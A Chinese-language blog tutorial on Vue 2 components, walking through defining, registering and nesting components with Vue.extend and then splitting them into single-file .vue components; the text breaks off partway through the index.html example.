<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144800.png" alt="  "><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144805.png" alt="  "></p>
<hr>
<blockquote>
<p><strong>组件分为了非单文件组件与单文件组件</strong></p>
<ul>
<li>非单文件组件：一个文件中包含有 n 个组件</li>
<li>单文件组件：一个文件中只有 1 个组件</li>
</ul>
</blockquote>
<h1 id="二、非单文件组件"><a href="#二、非单文件组件" class="headerlink" title="二、非单文件组件"></a>二、非单文件组件</h1><p>在项目开发中，使用最多的肯定是单文件组件，但非单文件组件是单文件组件的基础，拿下非单文件组件，单文件组件岂不是分分钟的事。</p>
<h2 id="1-案例入门"><a href="#1-案例入门" class="headerlink" title="1. 案例入门"></a>1. 案例入门</h2><blockquote>
<p><strong>Vue中使用组件的三大步骤：</strong></p>
<ul>
<li>定义组件(创建组件)</li>
<li>注册组件</li>
<li>使用组件(写组件标签)</li>
</ul>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>非单文件组件基本使用<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- 编写 school 组件标签 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- 编写 student 组件标签 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">student</span>&gt;</span><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	// 创建school组件</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	const school = Vue.extend(&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		//组件定义时，一定不要写 el 配置项，因为最终所有的组件都要被一个 vm 管理，由 vm 决定服务于哪个容器。</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		template:`</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">				<span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">				<span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名称：</span><span class="template-variable">&#123;&#123;<span class="name">schoolName</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">				<span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：</span><span class="template-variable">&#123;&#123;<span class="name">address</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			`,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		data()&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			return &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">				schoolName:&#x27;家里蹲&#x27;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">				address:&#x27;重庆&#x27;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	&#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	// 创建student组件</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	const student = Vue.extend(&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		template:`</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">				<span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">				<span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生姓名：</span><span class="template-variable">&#123;&#123;<span class="name">studentName</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">				<span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生年龄：</span><span class="template-variable">&#123;&#123;<span class="name">age</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			`,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		data()&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			return &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">				studentName:&#x27;划水艺术家&#x27;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">				age:20</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	&#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	//创建vm</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	new Vue(&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		el:&#x27;#root&#x27;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		data:&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			msg:&#x27;你好，划水艺术家！&#x27;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		&#125;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		// 注册组件（局部注册）</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		components:&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			school,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			student</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	&#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>运行效果：</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144810.png" alt="  "></p>
<hr>
<h2 id="2-全局注册"><a href="#2-全局注册" class="headerlink" title="2. 全局注册"></a>2. 全局注册</h2><ul>
<li><strong>局部注册</strong>：new Vue的时候传入<code>components</code>选项</li>
<li><strong>全局注册</strong>：<code>Vue.component(&#39;组件名&#39;,组件)</code></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建school组件</span></span><br><span class="line">	<span class="keyword">const</span> school = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span><br><span class="line">		<span class="comment">// ...</span></span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建student组件</span></span><br><span class="line">	<span class="keyword">const</span> student = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span><br><span class="line">		<span class="comment">// ...</span></span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建vm</span></span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">		<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span><br><span class="line">		<span class="comment">// ...</span></span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="comment">// 组件注册（全局注册）</span></span><br><span class="line">	<span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&quot;school&quot;</span>, school);</span><br><span class="line">	<span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&quot;student &quot;</span>, student );</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="3-组件的嵌套"><a href="#3-组件的嵌套" class="headerlink" title="3. 组件的嵌套"></a>3. 组件的嵌套</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>组件的嵌套<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">app</span>&gt;</span><span class="tag">&lt;/<span class="name">app</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	//定义student组件</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	const student = Vue.extend(&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		template:`</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			<span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			<span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生名称：</span><span class="template-variable">&#123;&#123;<span class="name">name</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			<span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生年龄：</span><span class="template-variable">&#123;&#123;<span class="name">age</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		`,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		data()&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			return &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">				name:&#x27;划水艺术家&#x27;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">				age:20</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	&#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	//定义school组件, school 组件里面有 student</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	const school = Vue.extend(&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		template:`</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			<span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			<span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名称：</span><span class="template-variable">&#123;&#123;<span class="name">name</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			<span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：</span><span class="template-variable">&#123;&#123;<span class="name">address</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			<span class="tag">&lt;<span class="name">student</span>&gt;</span><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		`,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		components:&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			student</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		&#125;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		data()&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			return &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">				name:&#x27;家里蹲&#x27;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">				address:&#x27;重庆&#x27;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	&#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	//定义hello组件</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	const hello = Vue.extend(&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		template:`</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">msg</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		`,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		data()&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			return &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">				msg:&quot;你好，划水艺术家&quot;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	&#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	//定义app组件， app 组件里面有 school、hello 组件</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	const app = Vue.extend(&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		template:`</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			<span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			<span class="tag">&lt;<span class="name">hello</span>&gt;</span><span class="tag">&lt;/<span class="name">hello</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			<span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		`,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		components:&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			school,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			hello</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	&#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	//创建vm</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	new Vue(&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		el:&#x27;#root&#x27;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		components:&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			app</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	&#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144815.png" alt="  "></p>
<hr>
<h2 id="4-组件总结"><a href="#4-组件总结" class="headerlink" title="4. 组件总结"></a>4. 组件总结</h2><p><strong>关于组件名：</strong></p>
<ul>
<li><p>一个单词组成：<br>① 首字母小写：school<br>② 首字母大写：School</p>
</li>
<li><p>多个单词组成：<br>① kebab-case命名：my-school<br>② CamelCase命名：MySchool &#x3D;&#x3D;（需要Vue脚手架支持）&#x3D;&#x3D;</p>
</li>
</ul>
<hr>
<p><strong>备注：</strong></p>
<ul>
<li>组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行</li>
<li>可以使用<code>name</code>配置项指定组件在开发者工具中呈现的名字</li>
</ul>
<hr>
<p><strong>关于组件标签：</strong><br>  ① <code>&lt;school&gt;&lt;/school&gt;</code><br>  ② <code>&lt;school/&gt;</code></p>
<ul>
<li><strong>不使用脚手架时，<code>&lt;school/&gt;</code>会导致后续组件不能渲染</strong></li>
</ul>
<hr>
<p>一个简写方式：<code>const school = Vue.extend(options)</code>可简写为：<code>const school = options</code></p>
<hr>
<h1 id="三、单文件组件"><a href="#三、单文件组件" class="headerlink" title="三、单文件组件"></a>三、单文件组件</h1><p><strong>我们依然使用上述非单文件组件中的例子，只是把每一个组件列出来单独成为一个组件。</strong></p>
<ul>
<li><strong>先看整个目录结构</strong></li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144819.png" alt="  "></p>
<ul>
<li><strong>Student.vue</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生姓名：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生年龄：&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">name</span>:<span class="string">&#x27;Student&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">name</span>:<span class="string">&#x27;划水艺术家&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">age</span>:<span class="number">20</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<ul>
<li><strong>School.vue</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;Demo&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名称：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showName&quot;</span>&gt;</span>点我提示学校名<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">name</span>:<span class="string">&#x27;School&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">name</span>:<span class="string">&#x27;家里蹲&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">address</span>:<span class="string">&#x27;重庆&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">showName</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#Demo</span>&#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background</span>: orange;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<ul>
<li><strong>App.vue</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">School</span>&gt;</span><span class="tag">&lt;/<span class="name">School</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Student</span>&gt;</span><span class="tag">&lt;/<span class="name">Student</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">School</span> <span class="keyword">from</span> <span class="string">&#x27;./School.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">Student</span> <span class="keyword">from</span> <span class="string">&#x27;./Student.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">name</span>:<span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">School</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Student</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<ul>
<li><strong>main.js</strong></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">template</span>:<span class="string">`&lt;App&gt;&lt;/App&gt;`</span>,</span><br><span class="line">  <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span><br><span class="line">  <span class="attr">components</span>:&#123;</span><br><span class="line">    <span class="title class_">App</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<ul>
<li><strong>index.html</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>单文件组件练习<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span 